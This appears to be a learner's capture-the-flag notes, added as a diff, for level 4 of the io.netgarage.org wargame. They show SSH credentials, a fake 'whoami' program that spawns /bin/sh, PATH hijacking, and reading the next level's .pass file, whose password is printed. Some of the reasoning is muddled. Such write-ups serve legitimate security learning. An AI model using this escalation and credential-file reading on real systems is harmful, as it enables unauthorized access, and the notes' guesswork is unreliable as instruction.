@@ -1,0 +1,263 @@
+connection: ssh level4@io.netgarage.org
+password: 7WhHa5HWMNRAYl9T
+
+level04.c:
+===============================================================================
+//writen by bla
+#include <stdlib.h>
+#include <stdio.h>
+
+int main() {
+        char username[1024];
+        FILE* f = popen("whoami","r");
+        fgets(username, sizeof(username), f);
+        printf("Welcome %s", username);
+
+        return 0;
+}
+===============================================================================
+
+./level04 username
+-> Welcome level5
+
+i see another buffer - so overflow?
+there are some references to a file - so maybe that is something i'd have to craft?
+there is no explicit function to write the function pointer to - so perhaps we want the username of an account with more permissions?
+
+lets just try putting more than 1024 characters as a username:
+
+$(python -c "print 2000*'\x61'")
+-> Welcome level5
+
+ahhh - main doesn't take any arguments, so that's not our route in here
+
+okay - so when the program runs "whoami", it returns level5
+so the perms of the program are the perms we need to progress
+
+FILE* f = popen("whoami","r");
+    this pipes the output of the "whoami" command and writes it to a file: "f"
+
+can we somehow change the files/commands the file accesses?
+
+$PATH documentation:
+echo $PATH prints the list of directories
+-> /usr/local/radare/bin:/usr/local/gdb10/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+if you put an executable in one of these directories, it can be run using a name in terminal (i think)
+so can we make our own whoami script that escalates our permissions?
+
+===============================================================================
+this is the code from level2 used to escalate:
+
+void catcher(int a) -> main()
+{
+        setresuid(geteuid(),geteuid(),geteuid());
+	printf("WIN!\n");
+        system("/bin/sh");
+        exit(0);
+}
+===============================================================================
+
+if we replace void -> main(), hopefully that will work
+
+now we have to make an executable, place it in the $PATH and hope
+i guess we have to put it in the $PATH before the actual whoami script - where is that located?
+
+running:
+type -a whoami
+-> /usr/bin/whoami
+
+
+lets make a temporary directory so we can make the c code as a file
+whats the syntax for that?
+mkdir ./TMP -> makes a temporary directory, lets try in-place:
+-> mkdir: cannot create directory ‘./TMP’: Permission denied
+
+hmmm lets see where we can do this temp file
+not in /home/agame
+not in /levels
+lets check on the website where i can make temporary files (i think i remember there being something there)
+
+on connection to the server you get:
+/tmp was cleared if you miss files that you did not back up they may be recoverable by contacting us on irc
+
+so it is possible to make a /tmp...
+oh - it already exists in the base directory - duh
+
+try
+echo "my script" whoami
+if i cat whoami, i get compiled code -> probably someone elses attempt
+lets give it a .c name:
+
+cat whoami.c yields:
+===================
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    system("/bin/sh");
+    return 0;
+}
+===================
+
+which isn't my script...
+lets just call it something hopefully no-one else has:
+echo "myscript" whoarenti.c:
+cat whoarenti.c
+-> No such file or directory (hmmmm....)
+
+echo "a" a -> cat a -> No such directory 
+im doing this wrong
+
+im missing the > that was obvious
+
+echo "myscript" > whoami.c
+cat whoami.c -> success!
+
+now to compile it:
+gcc whoami.c -o whoami (-o is the argument that creates an output file)
+
+okay, i get a bunch of errors:
+mainly "implicit decleration of X"
+probably need to do some includes (ill put the ones from level2)
+
+=================================================================
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+main()
+{
+        setresuid(geteuid(),geteuid(),geteuid());
+	printf("WIN!\n");
+        system("/bin/sh");
+        exit(0);
+}
+=================================================================
+
+still get an error:
+main type error -> i guess declare int main()?
+system("/bin/sh") says it expects an expression before "/"
+
+lets just make it super simple and printf something - that way we can tell if our whoami is called before the system one:
+
+new simple code:
+=================================================================
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    puts("hello");
+    return 0;
+}
+=================================================================
+
+ummm its not recognising the stuff inside the quotations as being a string?
+try '' instead?
+didn't work either... character constant too long for its type
+lets try printf instead
+
+yeah same issue - no idea how this is meant to work
+
+hmm - when i cat the whoami.c file from /tmp, it contains no quotation marks
+somehow maybe echo cant write quotation marks?
+
+apparently you can escape quotation marks, so lets try printf(\"hello\n\")
+
+new command:
+echo "#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    printf(\"hello\n\");
+    return 0;
+}" > whoami.c
+
+running yields:
+-> hello
+
+nice, now lets return the previous priveledge escalation part to it
+
+=================================================================
+echo "#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+int main()
+{
+    setresuid(geteuid(),geteuid(),geteuid());
+    printf(\"WIN!\");
+    system(\"/bin/sh\");
+    exit(0);
+}" > whoami.c
+=================================================================
+
+wierd, the WIN! line gets removed... lets move on for now anyways
+(-bash: !\n\": event not found)
+
+when trying to compile we get:
+setresuid is an implicit decleration of a function not declared
+
+its not declared in the level2 code - so im not sure how that one ran and this one doesn't
+lets remove it for the moment and continue
+
+okay nice - when we run it we get:
+sh-4.3$ 
+This doesn't have the permissions we want but thats fine, when run by the script it ought to give us the scripts effective perms
+
+maybe the temp directory sits above the standard whoami script in $PATH, so lets run the level
+-> Welcome level5
+
+hmm okay, not yet
+how do we move the script from /tmp to the path?
+doesnt seem like it, all the perms don't allow me to move files around
+
+since we could print the $PATH, can we edit the $PATH itself?
+ideally, as the origional $PATH variable looked like this:
+/usr/local/radare/bin:/usr/local/gdb10/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+we want our new $PATH to look like:
+"directory containing my script":/usr/local/radare/bin:/usr/local/gdb10/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+pwd yeilds:
+/tmp
+so its probably /usr/tmp?
+
+lets try export PATH=:"new path":"another new path"
+export PATH=:/usr/tmp:/usr/local/radare/bin:/usr/local/gdb10/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+hmmm, the new $PATH is edited, but running level0 doesn't yeild us a higher permission shell
+maybe its usr/local/tmp?
+
+export PATH=:/usr/local/tmp:/usr/local/radare/bin:/usr/local/gdb10/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+that doesnt work either, is ths script still in /tmp?
+yup still there - maybe it gets confused which whoami to use? -> make a directory in /tmp and move it into that
+permission denied to mkdir
+
+oh, i can do it from the home directory for whatever reason:
+level4@io:/$ mkdir /tmp/tempscripts -> i have to cd from above, i cant cd /tmp, cd /tempscripts
+
+cause of the wierd perms, lets try from within the temporary directory:
+export PATH=:/usr/local/tmp/tempscripts:/usr/local/radare/bin:/usr/local/gdb10/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+ohhhhh I have to un the script from inside the temporary directory
+level4@io:/tmp/tempscripts$ /levels/level04
+-> sh-4.3$
+
+okay lets see if this can get us access to the password for the next level
+
+cat /home/level5/.pass
+
+Welcome DNLM3Vu0mZfX0pDd
+
+oh interesting, cause its a substitute for the whoami command, the program was still waiting for the return of the call - so when i cat a file, it got piped to the code and was set as the username.
+
+
+
+
+
+
